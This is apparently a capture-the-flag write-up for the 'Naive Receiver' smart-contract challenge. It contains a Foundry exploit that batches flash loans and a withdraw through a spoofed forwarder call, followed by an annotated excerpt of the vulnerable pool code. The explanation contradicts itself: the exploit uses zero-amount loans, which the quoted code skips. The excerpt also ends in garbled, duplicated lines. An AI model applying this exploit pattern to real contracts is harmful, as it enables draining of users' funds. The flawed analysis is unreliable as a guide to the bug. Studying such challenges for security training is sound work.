## Challenge 2: Naive Receiver

### Vulnerability
The `NaiveReceiverPool` allows anyone to request flash loans on behalf of any receiver, and the receiver pays fees without validation.

### Exploit Code
```solidity
// In NaiveReceiver.t.sol - test_naiveReceiver() function
function test_naiveReceiver() public checkSolvedByPlayer {
    // Prepare the multicall: 10 flash loans + 1 withdraw
    bytes[] memory calls = new bytes[](11);

    // 10 flash loans (0 amount, but 1 WETH fee each)
    for (uint i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(
            pool.flashLoan,
            (address(receiver), address(pool.weth()), 0, "")
        );
    }

    // Withdraw all WETH from the pool to recovery address
    calls[10] = abi.encodeCall(
        pool.withdraw,
        (1000 ether, payable(recovery))
    );

    // Owner is the original deployer of the pool
    address owner = address(100); // Standard in this challenge

    // Use the forwarder to call multicall, so _msgSender() returns owner
    // We impersonate the forwarder to call execute()
    vm.startPrank(address(forwarder));

    // forwarder.execute(target, data, forwarderSender)
    forwarder.execute{value: 0}(
        address(pool),
        abi.encodeCall(pool.multicall, (calls)),
        owner // This gets appended to msg.data, making _msgSender() = owner
    );

    vm.stopPrank();

    // ✅ FlashLoanReceiver balance should now be 0
    // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
    // Challenge solved!
}   
```

### Why it works
- Flash loans can be triggered by anyone on behalf of any receiver — the `flashLoan` function does not restrict who can initiate a loan.
- The receiver pays a 1 ETH (WETH) fee for each loan, but it lacks access control or validation to prevent unauthorized or repeated calls.
- `multicall` enables bundling multiple flash loan calls and a final `withdraw` into a single transaction, ensuring atomicity and efficiency.
- By routing the `multicall` through the trusted `BasicForwarder`, we spoof the sender context so `_msgSender()` returns the pool owner, allowing the `withdraw` to succeed and transfer all pool funds to the recovery address.   




### Vulnerability Analysis
**File:** `src/naive-receiver/NaiveReceiverPool.sol`
**Vulnerable Code (lines ~76-85):**
```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // ✅ Validates token — only WETH supported
    if (token != address(weth)) revert UnsupportedCurrency();

    // 🔒 Loan only proceeds if amount >= fee (i.e., at least 1 WETH)
    // This prevents *some* abuse, but not all — see below
    if (amount >= FLASH_LOAN_FEE) {
        // 💸 Transfers the requested amount to the receiver
        // Even if amount == 1 WETH (minimum), the receiver will pay 2 WETH total (principal + fee)
        weth.transfer(address(receiver), amount);

        // 📈 Pool collects the fixed fee regardless of loan size
        totalFees += FLASH_LOAN_FEE;

        // 🔁 Receiver must implement onFlashLoan and return success
        // But it has **no way to validate** who initiated the loan
        if (receiver.onFlashLoan(msg.sender, token, amount, FLASH_LOAN_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        // 💣 Forces receiver to repay: principal + 1 WETH fee
        // This is the core exploit: even a 1 WETH loan costs the receiver 2 WETH
        // And since **anyone** can trigger it, an attacker can drain the receiver over multiple calls
        weth.transferFrom(address(receiver), address(this), amount + FLASH_LOAN_FEE);
    }
    // 🟡 If amount < FLASH_LOAN_FEE (i.e., < 1 WETH), the loan is silently skipped
    // But attacker can still use amount == 1 WETH to trigger the fee

    return true;
}   true;
}
```



